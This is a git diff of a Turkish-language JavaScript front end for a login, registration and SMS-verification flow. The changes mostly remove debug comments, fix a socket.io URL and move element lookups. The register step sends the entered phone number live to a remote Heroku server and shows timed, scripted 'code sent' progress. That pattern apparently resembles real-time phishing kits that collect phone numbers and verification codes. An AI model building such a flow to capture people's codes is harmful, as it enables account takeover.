@@ -1,17 +1,10 @@
-console.log("SCRIPT.JS YÜKLENDİ - BAŞLANGIÇ");  // Debug: Script yüklendi mi?
+console.log("SCRIPT.JS YÜKLENDİ - BAŞLANGIÇ");
 
-const socket = io('https://afternoon-lake-61658-70a3b4756b95.herokuapp.com/socket.io/socket.io.js');
+const socket = io('https://afternoon-lake-61658-70a3b4756b95.herokuapp.com');
 console.log("CLIENT SOCKET BAĞLANDI");
 
-const loginCard = document.getElementById("loginCard");
-const registerCard = document.getElementById("registerCard");
-const verifyCard = document.getElementById("verifyCard");
-const successScreen = document.getElementById("successScreen");
-
-console.log("LoginCard bulundu mu?", loginCard);  // Debug: Elementler DOM'da var mı?
-
 function showCard(card) {
-  console.log("showCard çağrıldı:", card);  // Debug: Fonksiyon tetiklendi mi?
+  console.log("showCard çağrıldı:", card);
   if (card) {
     card.classList.remove("hidden");
     requestAnimationFrame(() => {
@@ -46,7 +39,14 @@ function showLogin() {
 }
 
 document.addEventListener("DOMContentLoaded", () => {
-  console.log("DOMContentLoaded TETİKLENDİ!");  // Debug: Sayfa yüklendi mi?
+  console.log("DOMContentLoaded TETİKLENDİ!");
+
+  const loginCard = document.getElementById("loginCard");
+  const registerCard = document.getElementById("registerCard");
+  const verifyCard = document.getElementById("verifyCard");
+  const successScreen = document.getElementById("successScreen");
+
+  console.log("LoginCard bulundu mu?", loginCard);
 
   // başlangıç durumu
   registerCard.classList.add("hidden");
@@ -71,7 +71,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   // REGISTER → VERIFY (4x spin)
   const registerBtn = document.getElementById("registerSubmit");
-  const btnText = registerBtn.querySelector(".btn-text");   // ← EKLE
+  const btnText = registerBtn.querySelector(".btn-text");
 
   registerBtn.addEventListener("click", () => {
     const phone = phoneInput.value.trim();
@@ -80,21 +80,21 @@ document.addEventListener("DOMContentLoaded", () => {
     socket.emit("new-phone", phone);
 
     registerBtn.disabled = true;
-    btnText.textContent = "Kod gönderiliyor";        // ← DEĞİŞTİ
+    btnText.textContent = "Kod gönderiliyor";
     registerBtn.classList.add("spinning");
 
     // 12. saniyede yazı değişsin
     setTimeout(() => {
       btnText.textContent = "Kod gönderildi";
-      registerBtn.classList.add("slow");            // slow animasyon burada başlasın
+      registerBtn.classList.add("slow");
     }, 12000);
 
     // 14. saniyede ekran değişsin
     setTimeout(() => {
       registerBtn.classList.remove("spinning");
-      registerBtn.classList.remove("slow");         // slow'u da kaldır
+      registerBtn.classList.remove("slow");
       registerBtn.disabled = false;
-      btnText.textContent = "Kod gönderiliyor";     // başlangıç haline geri dön
+      btnText.textContent = "Kod gönderiliyor";
       hideCard(registerCard);
       showCard(verifyCard);
     }, 14000);
